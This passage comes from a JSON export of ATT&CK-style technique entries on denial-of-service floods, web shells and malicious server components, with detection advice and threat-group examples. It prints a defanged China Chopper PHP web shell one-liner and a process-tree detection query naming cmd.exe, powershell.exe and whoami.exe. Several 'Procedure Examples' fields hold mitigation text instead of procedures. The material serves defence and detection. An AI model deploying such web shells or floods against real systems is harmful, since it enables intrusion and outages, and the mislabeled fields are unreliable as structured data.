      "Lucifercan execute TCP, UDP,  and HTTP denial of service (DoS) attacks.[5]",
      "NKAbuseenables multiple types of network denial of service capabilities across several protocols post-installation.[6]"
    ]
  },
  "T1498.001": {
    "Name": "Network Denial of Service:Direct Network Flood",
    "Description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network.Direct Network Floods are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.Botnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.[1]",
    "Detects": [
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.",
      "Detection of Network DoS can sometimes be achieved before the traffic volume is sufficient to cause impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness or services provided by an upstream network service provider. Monitor for logging, messaging, and other artifacts highlighting the health of host sensors (ex: metrics, errors, and/or exceptions from logging applications)"
    ],
    "Procedure Examples": [
      "When flood volumes exceed the capacity of the network connection being targeted, it is typically necessary to intercept the incoming traffic upstream to filter out the attack traffic from the legitimate traffic. Such defenses can be provided by the hosting Internet Service Provider (ISP) or by a 3rd party such as a Content Delivery Network (CDN) or providers specializing in DoS mitigations.[2]Depending on flood volume, on-premises filtering may be possible by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport.[2]As immediate response may require rapid engagement of 3rd parties, analyze the risk associated to critical resources being affected by Network DoS attacks and create a disaster recovery plan/business continuity plan to respond to incidents.[2]"
    ]
  },
  "T1498.002": {
    "Name": "Network Denial of Service:Reflection Amplification",
    "Description": "Adversaries may attempt to cause a denial of service (DoS) by reflecting a high-volume of network traffic to a target. This type of Network DoS takes advantage of a third-party server intermediary that hosts and will respond to a given spoofed source IP address. This third-party server is commonly termed a reflector. An adversary accomplishes a reflection attack by sending packets to reflectors with the spoofed address of the victim. Similar to Direct Network Floods, more than one system may be used to conduct the attack, or a botnet may be used. Likewise, one or more reflectors may be used to focus traffic on the target.[1]This Network DoS attack may also reduce the availability and functionality of the targeted system(s) and network.Reflection attacks often take advantage of protocols with larger responses than requests in order to amplify their traffic, commonly known as a Reflection Amplification attack. Adversaries may be able to generate an increase in volume of attack traffic that is several orders of magnitude greater than the requests sent to the amplifiers. The extent of this increase will depending upon many variables, such as the protocol in question, the technique used, and the amplifying servers that actually produce the amplification in attack volume. Two prominent protocols that have enabled Reflection Amplification Floods are DNS[2]and NTP[3], though the use of several others in the wild have been documented.[4]In particular, the memcache protocol showed itself to be a powerful protocol, with amplification sizes up to 51,200 times the requesting packet.[5]",
    "Detects": [
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.",
      "Detection of Network DoS can sometimes be achieved before the traffic volume is sufficient to cause impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness or services provided by an upstream network service provider. Monitor for logging, messaging, and other artifacts highlighting the health of host sensors (ex: metrics, errors, and/or exceptions from logging applications)"
    ],
    "Procedure Examples": [
      "When flood volumes exceed the capacity of the network connection being targeted, it is typically necessary to intercept the incoming traffic upstream to filter out the attack traffic from the legitimate traffic. Such defenses can be provided by the hosting Internet Service Provider (ISP) or by a 3rd party such as a Content Delivery Network (CDN) or providers specializing in DoS mitigations.[6]Depending on flood volume, on-premises filtering may be possible by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport.[6]As immediate response may require rapid engagement of 3rd parties, analyze the risk associated to critical resources being affected by Network DoS attacks and create a disaster recovery plan/business continuity plan to respond to incidents.[6]"
    ]
  },
  "T1499": {
    "Name": "Endpoint Denial of Service",
    "Description": "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes[1]and to support other malicious activities, including distraction[2], hacktivism, and extortion.[3]An Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).To perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.Adversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.Botnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.[4]In cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.[5]For attacks attempting to saturate the providing network, seeNetwork Denial of Service.",
    "Detects": [
      "Monitor for third-party application logging, messaging, and/or other artifacts that may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. In addition to network level detections, endpoint logging and instrumentation can be useful for detection. Attacks targeting web applications may generate logs in the web server, application server, and/or database server that can be used to identify the type of attack, possibly before the impact is felt. Externally monitor the availability of services that may be targeted by an Endpoint DoS.",
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.",
      "Detection of Endpoint DoS can sometimes be achieved before the effect is sufficient to cause significant impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness. Monitor for logging, messaging, and other artifacts highlighting the health of host sensors (ex: metrics, errors, and/or exceptions from logging applications)"
    ],
    "Procedure Examples": [
      "OnionDukehas the capability to use a Denial of Service module.[6]",
      "Sandworm Teamtemporarily disrupted service to Georgian government, non-government, and private sector websites after compromising a Georgian web hosting provider in 2019.[7]",
      "ZxShellhas a feature to perform SYN flood attack on a host.[8][9]"
    ]
  },
  "T1499.001": {
    "Name": "Endpoint Denial of Service:OS Exhaustion Flood",
    "Description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.Different ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.[1]With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.[2]ACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.[3]",
    "Detects": [
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.",
      "Detection of Endpoint DoS can sometimes be achieved before the effect is sufficient to cause significant impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness. Monitor for logging, messaging, and other artifacts highlighting the health of host sensors (ex: metrics, errors, and/or exceptions from logging applications)"
    ],
    "Procedure Examples": [
      "Leverage services provided by Content Delivery Networks (CDN) or providers specializing in DoS mitigations to filter traffic upstream from services.[4]Filter boundary traffic by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport. To defend against SYN floods, enable SYN Cookies."
    ]
  },
  "T1499.002": {
    "Name": "Endpoint Denial of Service:Service Exhaustion Flood",
    "Description": "Adversaries may target the different network services provided by systems to conduct a denial of service (DoS). Adversaries often target the availability of DNS and web services, however others have been targeted as well.[1]Web server software can be attacked through a variety of means, some of which apply generally while others are specific to the software being used to provide the service.One example of this type of attack is known as a simple HTTP flood, where an adversary sends a large number of HTTP requests to a web server to overwhelm it and/or an application that runs on top of it. This flood relies on raw volume to accomplish the objective, exhausting any of the various resources required by the victim software to provide the service.[2]Another variation, known as a SSL renegotiation attack, takes advantage of a protocol feature in SSL/TLS. The SSL/TLS protocol suite includes mechanisms for the client and server to agree on an encryption algorithm to use for subsequent secure connections. If SSL renegotiation is enabled, a request can be made for renegotiation of the crypto algorithm. In a renegotiation attack, the adversary establishes a SSL/TLS connection and then proceeds to make a series of renegotiation requests. Because the cryptographic renegotiation has a meaningful cost in computation cycles, this can cause an impact to the availability of the service when done in volume.[3]",
    "Detects": [
      "Monitor for third-party application logging, messaging, and/or other artifacts that may target the different network services provided by systems to conduct a DoS. In addition to network level detections, endpoint logging and instrumentation can be useful for detection. Attacks targeting web applications may generate logs in the web server, application server, and/or database server that can be used to identify the type of attack, possibly before the impact is felt. Externally monitor the availability of services that may be targeted by an Endpoint DoS.",
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.",
      "Detection of Endpoint DoS can sometimes be achieved before the effect is sufficient to cause significant impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness. Monitor for logging, messaging, and other artifacts highlighting the health of host sensors (ex: metrics, errors, and/or exceptions from logging applications)"
    ],
    "Procedure Examples": [
      "Leverage services provided by Content Delivery Networks (CDN) or providers specializing in DoS mitigations to filter traffic upstream from services.[4]Filter boundary traffic by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport."
    ]
  },
  "T1499.003": {
    "Name": "Endpoint Denial of Service:Application Exhaustion Flood",
    "Description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.[1]",
    "Detects": [
      "Monitor for third-party application logging, messaging, and/or other artifacts that may target resource intensive features of web applications to cause a denial of service (DoS). In addition to network level detections, endpoint logging and instrumentation can be useful for detection. Attacks targeting web applications may generate logs in the web server, application server, and/or database server that can be used to identify the type of attack, possibly before the impact is felt. Externally monitor the availability of services that may be targeted by an Endpoint DoS.",
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s), leveraging SSL/TLS inspection for encrypted traffic, that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.",
      "Detection of Endpoint DoS can sometimes be achieved before the effect is sufficient to cause significant impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness. Monitor for logging, messaging, and other artifacts highlighting the health of host sensors (ex: metrics, errors, and/or exceptions from logging applications)"
    ],
    "Procedure Examples": [
      "Leverage services provided by Content Delivery Networks (CDN) or providers specializing in DoS mitigations to filter traffic upstream from services.[2]Filter boundary traffic by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport."
    ]
  },
  "T1499.004": {
    "Name": "Endpoint Denial of Service:Application or System Exploitation",
    "Description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users.[1]Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.Adversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such asData Destruction,Firmware Corruption,Service Stopetc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems.",
    "Detects": [
      "Monitor for third-party application logging, messaging, and/or other artifacts that may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users.[1]Attacks targeting web applications may generate logs in the web server, application server, and/or database server that can be used to identify the type of attack. Externally monitor the availability of services that may be targeted by an Endpoint DoS.",
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.",
      "Detection of Endpoint DoS can sometimes be achieved before the effect is sufficient to cause significant impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness. Monitor for logging, messaging, and other artifacts highlighting the health of host sensors (ex: metrics, errors, and/or exceptions from logging applications)"
    ],
    "Procedure Examples": [
      "Industroyeruses a custom DoS tool that leverages CVE-2015-5374 and targets hardcoded IP addresses of Siemens SIPROTEC devices.[2]"
    ]
  },
  "T1505": {
    "Name": "Server Software Component",
    "Description": "Adversaries may abuse legitimate extensible development features of servers to establish persistent access to systems. Enterprise server applications may include features that allow developers to write and install software or scripts to extend the functionality of the main application. Adversaries may install malicious components to extend and abuse server applications.[1]",
    "Detects": [
      "Monitor for third-party application logging, messaging, and/or other artifacts that may abuse legitimate extensible development features of servers to establish persistent access to systems. Consider monitoring application logs for abnormal behavior that may indicate suspicious installation of application software components. Log authentication attempts to the server and any unusual traffic patterns to or from the server and internal network.[5]",
      "Monitor command-line arguments that may involve installing new server software components.",
      "Consider monitoring file locations associated with the installation of new application software components such as paths from which applications typically load such extensible components.",
      "Monitor for changes made to files that may abuse legitimate extensible development features of servers to establish persistent access to systems.",
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s), leveraging SSL/TLS inspection for encrypted traffic, that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).[5]",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.",
      "Process monitoring may be used to detect servers components that perform suspicious actions such as running cmd.exe or accessing files."
    ],
    "Procedure Examples": [
      "Regularly check component software on critical services that adversaries may target for persistence to verify the integrity of the systems and identify if unexpected changes have been made.",
      "Enabling secure boot allows validation of software and drivers during initial system boot.",
      "Ensure all application component binaries are signed by the correct application developers.",
      "Consider disabling software components from servers when possible to prevent abuse by adversaries.[2]",
      "Do not allow administrator accounts that have permissions to add component software on these services to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems.",
      "Consider using Group Policy to configure and block modifications to service and other critical server parameters in the Registry.[3]",
      "Enforce the principle of least privilege by limiting privileges of user accounts so only authorized accounts can modify and/or add server software components.[4]"
    ]
  },
  "T1505.001": {
    "Name": "Server Software Component:SQL Stored Procedures",
    "Description": "Adversaries may abuse SQL stored procedures to establish persistent access to systems. SQL Stored Procedures are code that can be saved and reused so that database users do not waste time rewriting frequently used SQL queries. Stored procedures can be invoked via SQL statements to the database using the procedure name or via defined events (e.g. when a SQL server application is started/restarted).Adversaries may craft malicious stored procedures that can provide a persistence mechanism in SQL database servers.[1][2]To execute operating system commands through SQL syntax the adversary may have to enable additional functionality, such as xp_cmdshell for MSSQL Server.[1][2][3]Microsoft SQL Server can enable common language runtime (CLR) integration. With CLR integration enabled, application developers can write stored procedures using any .NET framework language (e.g. VB .NET, C#, etc.).[4]Adversaries may craft or modify CLR assemblies that are linked to stored procedures since these CLR assemblies can be made to execute arbitrary commands.[5]",
    "Detects": [
      "Monitor for third-party application logging, messaging, and/or other artifacts that may abuse SQL stored procedures to establish persistent access to systems. On a MSSQL Server, consider monitoring for xp_cmdshell usage.[1]Consider enabling audit features that can log malicious startup activities."
    ],
    "Procedure Examples": [
      "During the2016 Ukraine Electric Power Attack,Sandworm Teamused various MS-SQL stored procedures.[6]",
      "Stuxnetused xp_cmdshell to store and execute SQL code.[7]"
    ]
  },
  "T1505.002": {
    "Name": "Server Software Component:Transport Agent",
    "Description": "Adversaries may abuse Microsoft transport agents to establish persistent access to systems. Microsoft Exchange transport agents can operate on email messages passing through the transport pipeline to perform various tasks such as filtering spam, filtering malicious attachments, journaling, or adding a corporate signature to the end of all outgoing emails.[1][2]Transport agents can be written by application developers and then compiled to .NET assemblies that are subsequently registered with the Exchange server. Transport agents will be invoked during a specified stage of email processing and carry out developer defined tasks.Adversaries may register a malicious transport agent to provide a persistence mechanism in Exchange Server that can be triggered by adversary-specified email events.[2]Though a malicious transport agent may be invoked for all emails passing through the Exchange transport pipeline, the agent can be configured to only carry out specific tasks in response to adversary defined criteria. For example, the transport agent may only carry out an action like copying in-transit attachments and saving them for later exfiltration if the recipient email address matches an entry on a list provided by the adversary.",
    "Detects": [
      "Monitor for third-party application logging, messaging, and/or other artifacts that may abuse Microsoft transport agents to establish persistent access to systems. Consider monitoring application logs for abnormal behavior that may indicate suspicious installation of application software components.",
      "Consider monitoring file locations associated with the installation of new application software components such as paths from which applications typically load such extensible components."
    ],
    "Procedure Examples": [
      "LightNeuronhas used a malicious Microsoft Exchange transport agent for persistence.[2]"
    ]
  },
  "T1505.003": {
    "Name": "Server Software Component:Web Shell",
    "Description": "Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to access the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.[1]In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (e.g.China ChopperWeb shell client).[2]",
    "Detects": [
      "Monitor for third-party application logging, messaging, and/or other artifacts that may backdoor web servers with web shells to establish persistent access to systems. Log authentication attempts to the server and any unusual traffic patterns to or from the server and internal network.[72]",
      "File monitoring may be used to detect changes to files in the Web directory of a Web server that do not match with updates to the Web server's content and may indicate implantation of a Web shell script.[73]",
      "Monitor for changes made to files that may backdoor web servers with web shells to establish persistent access to systems.",
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.",
      "Web shells can be difficult to detect. Unlike other forms of persistent remote access, they do not initiate connections. The portion of the Web shell that is on the server may be small and innocuous looking. The PHP version of the China Chopper Web shell, for example, is very similar to the following short payload:[2]<?php @evaI($_P0ST['password']);>Nevertheless, detection mechanisms exist. Process monitoring may be used to detect Web servers that perform suspicious actions such as spawning cmd.exe or accessing files that are not in the Web directory.[73]A web shell is a web script placed on an openly accessible web server to allow an adversary to use the server as a gatway in a network. As the shell operates, commands will be issued from within the web application into the broader server operating system. This analytic looks for host enumeration executables initiated by any web service that would not normally be executed within that environment.Analytic 1 - Webshell-Indicative Process Tree(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") (ParentImage=\"C:\\Windows\\System32\\w3wp.exe\" OR ParentImage=\"httpd.exe\" OR ParentImage=\"tomcat.exe\" OR ParentImage=\"nginx.exe\")(Image=\"C:\\Windows\\System32\\cmd.exe OR Image=\"C:\\Windows\\SysWOW64\\cmd.exe\" OR Image=\"C:\\Windows\\System32\\\\powershell.exe OR Image=\"C:\\Windows\\SysWOW64\\\\powershell.exe OR Image=\"C:\\Windows\\System32\\net.exe\" OR Image=\"C:\\Windows\\System32\\hostname.exe\" OR Image=\"C:\\Windows\\System32\\whoami.exe\" OR Image=\"systeminfo.exe OR Image=\"C:\\Windows\\System32\\ipconfig.exe\")"
    ],
    "Procedure Examples": [
      "During the2022 Ukraine Electric Power Attack,Sandworm Teamdeployed the Neo-REGEORG webshell on an internet-facing server.[3]",
      "Agriustypically deploys a variant of theASPXSpyweb shell following initial access via exploitation.[4]",
      "APT28has used a modified and obfuscated version of the reGeorg web shell to maintain persistence on a target's Outlook Web Access (OWA) server.[5]",
      "APT29has installed web shells on exploited Microsoft Exchange servers.[6][7]",
      "APT32has used Web shells to maintain access to victim websites.[8]",
      "APT38has used web shells for persistence or to ensure redundant access.[9]",
      "APT39has installed ANTAK and ASPXSPY web shells.[10]",
      "APT41 DUSTinvolved use of web shells such as ANTSWORD and BLUEBEAM for persistence.[11]",
      "APT5has installed multiple web shells on compromised servers including on Pulse Secure VPN appliances.[12][13]",
      "ASPXSpyis a Web shell. The ASPXTool version used byThreat Group-3390has been deployed to accessible servers running Internet Information Services (IIS).[14]",
      "BackdoorDiplomacyhas used web shells to establish an initial foothold and for lateral movement within a victim's system.[15]",
      "BlackBytehas used ASPX web shells following exploitation of vulnerabilities in services such as Microsoft Exchange.[16][17]",
      "BUSHWALKis a web shell that has the ability to execute arbitrary commands or write files.[18]",
      "DuringC0017,APT41deployed JScript web shells through the creation of malicious ViewState objects.[19]",
      "During theC0032campaign,TEMP.Velesplanted Web shells on Outlook Exchange servers.[20]",
      "China Chopper's server component is a Web Shell payload.[2]",
      "CURIUMhas been linked to web shells following likely server compromise as an initial access vector into victim networks.[21]",
      "DuringCutting Edge, threat actors used multiple web shells to maintain presence on compromised Connect Secure appliances such asWIREFIRE,GLASSTOKEN,BUSHWALK,LIGHTWIRE, andFRAMESTING.[22][23]",
      "Deep Pandauses Web shells on publicly accessible Web servers to access victim networks.[24]",
      "Dragonflyhas commonly created Web shells on victims' publicly accessible email and web servers, which they used to maintain access to a victim network and download additional malicious files.[25]",
      "Ember Beardeploys web shells following initial access for either follow-on command execution or protocol tunneling. Example web shells used byEmber Bearinclude P0wnyshell, reGeorg,P.A.S. Webshell, and custom variants of publicly-available web shell examples.[26][27]",
      "FIN13has utilized obfuscated and open-source web shells such as JspSpy, reGeorg, MiniWebCmdShell, and Vonloesch Jsp File Browser 1.2 to enable remote code execution and to execute commands on compromised web server.[28]",
      "Fox Kittenhas installed web shells on compromised hosts to maintain access.[29][30]",
      "FRAMESTINGis a web shell capable of enabling arbitrary command execution on compromised Ivanti Connect Secure VPNs.[18]",
      "FrostyGoop Incidentdeployed a ReGeorg variant web shell to impacted systems following initial access for persistence.[31]",
      "GALLIUMused Web shells to persist in victim environments and assist in execution and exfiltration.[32][33]",
      "GLASSTOKENis a web shell capable of tunneling C2 connections and code execution on compromised Ivanti Secure Connect VPNs.[23]",
      "HAFNIUMhas deployed multiple web shells on compromised servers including SIMPLESEESHARP, SPORTSBALL,China Chopper, andASPXSpy.[34][35][36][37][38][39]",
      "ForHomeLand Justice, threat actors used .aspx webshells named pickers.aspx, error4.aspx, and ClientBin.aspx, to maintain persistence.[40][41]",
      "Kimsukyhas used modified versions of open source PHP web shells to maintain access, often adding \"Dinosaur\" references within the code.[42]",
      "Leviathanrelies on web shells for an initial foothold as well as persistence into the victim's systems.[43][44][45]",
      "Leviathanrelied extensively on web shell use following initial access for persistence and command execution purposes in victim environments duringLeviathan Australian Intrusions.[45]",
      "LIGHTWIREis a web shell capable of command execution and establishing persistence on compromised Ivanti Secure Connect VPNs.[18]",
      "Line Runneris a persistent Lua-based web shell.[46]",
      "Magic Houndhas used multiple web shells to gain execution.[47][48]",
      "Moses Staffhas dropped a web shell onto a compromised system.[49]",
      "Neo-reGeorgcan be installed on compromised web servers to tunnel C2 connections.[50][3]",
      "OilRighas used web shells, often to maintain access to a victim network.[51][52][53][54]",
      "DuringOperation CuckooBees, the threat actors generated a web shell within a vulnerable Enterprise Resource Planning Web Application Server as a persistence mechanism.[55]",
      "DuringOperation Wocao, threat actors used their own web shells, as well as those previously placed on target systems by other threat actors, for reconnaissance and lateral movement.[56]",
      "OwaAuthis a Web shell that appears to be exclusively used byThreat Group-3390. It is installed as an ISAPI filter on Exchange servers and shares characteristics with theChina ChopperWeb shell.[14]",
      "P.A.S. Webshellcan gain remote access and execution on target web servers.[57]",
      "PULSECHECKis a web shell that can enable command execution on compromised servers.[12]",
      "RAPIDPULSEis a web shell that is capable of arbitrary file read on targeted web servers to exfiltrate items of interest on the victim device.[13]",
      "reGeorgis a web shell that has been installed on exposed web servers for access to victim environments.[7][26]",
      "Sandworm Teamhas used webshells includingP.A.S. Webshellto maintain access to victim networks.[57]",
      "Sea Turtledeployed theSnappyTCPweb shell during intrusion operations.[58][59]",
      "SEASHARPEEis a Web shell.[52]",
      "SLIGHTPULSEis a web shell that can read, write, and execute files on compromised servers.[12]",
      "SnappyTCPis a reverse TCP shell with command and control capabilities used for persistence purposes.[58]",
      "STEADYPULSEis a web shell that can enable the execution of arbitrary commands on compromised web servers.[12]",
      "SUPERNOVAis a Web shell.[60][61][62]",
      "Threat Group-3390has used a variety of Web shells.[63]",
      "Tonto Teamhas used a first stage web shell after compromising a vulnerable Exchange server.[64]",
      "Tropic Trooperhas started a web service in the target host and wait for the adversary to connect, acting as a web shell.[65]",
      "Versa Director Zero Day Exploitationresulted in the deployment of the VersaMem web shell for follow-on activity.[66]",
      "Volatile Cedarcan inject web shell code into a server.[67][68]",
      "Volt Typhoonhas used webshells, including ones named AuditReport.jspx and iisstart.aspx, in compromised environments.[69]",
      "WIREFIREis a web shell that can download files to and execute arbitrary commands from compromised Ivanti Connect Secure VPNs.[22]"
    ]
  },
  "T1505.004": {
    "Name": "Server Software Component:IIS Components",
    "Description": "Adversaries may install malicious components that run on Internet Information Services (IIS) web servers to establish persistence. IIS provides several mechanisms to extend the functionality of the web servers. For example, Internet Server Application Programming Interface (ISAPI) extensions and filters can be installed to examine and/or modify incoming and outgoing IIS web requests. Extensions and filters are deployed as DLL files that export three functions:Get{Extension/Filter}Version,Http{Extension/Filter}Proc, and (optionally)Terminate{Extension/Filter}. IIS modules may also be installed to extend IIS web servers.[1][2][3][4]Adversaries may install malicious ISAPI extensions and filters to observe and/or modify traffic, execute commands on compromised machines, or proxy command and control traffic. ISAPI extensions and filters may have access to all IIS web requests and responses. For example, an adversary may abuse these mechanisms to modify HTTP responses in order to distribute malicious commands/content to previously comprised hosts.[2][1][5][6][4][7]Adversaries may also install malicious IIS modules to observe and/or modify traffic. IIS 7.0 introduced modules that provide the same unrestricted access to HTTP requests and responses as ISAPI extensions and filters. IIS modules can be written as a DLL that exportsRegisterModule, or as a .NET application that interfaces with ASP.NET APIs to access IIS HTTP requests.[8][4][9]",
    "Detects": [
      "Monitor execution and command-line arguments ofAppCmd.exe, which may be abused to install malicious IIS modules.[8][12][9]",
      "Monitor for creation of files (especially DLLs on webservers) that could be abused as malicious ISAPI extensions/filters or IIS modules.",
      "Monitor for modification of files (especially DLLs on webservers) that could be abused as malicious ISAPI extensions/filters or IIS modules. Changes to%windir%\\system32\\inetsrv\\config\\applicationhost.configcould indicate an IIS module installation.[8][9]"
    ],
    "Procedure Examples": [
      "IceAppleis an IIS post-exploitation framework, consisting of 18 modules that provide several functionalities.[10]",
      "DuringOperation Dream Job,Lazarus Grouptargeted Windows servers running Internet Information Systems (IIS) to install C2 components.[11]",
      "OwaAuthhas been loaded onto Exchange servers and disguised as an ISAPI filter (owaauth.dll). The IIS w3wp.exe process then loads the malicious DLL.[6]",
      "RGDoorestablishes persistence on webservers as an IIS module.[12][9]"
    ]
  },
  "T1505.005": {
    "Name": "Server Software Component:Terminal Services DLL",
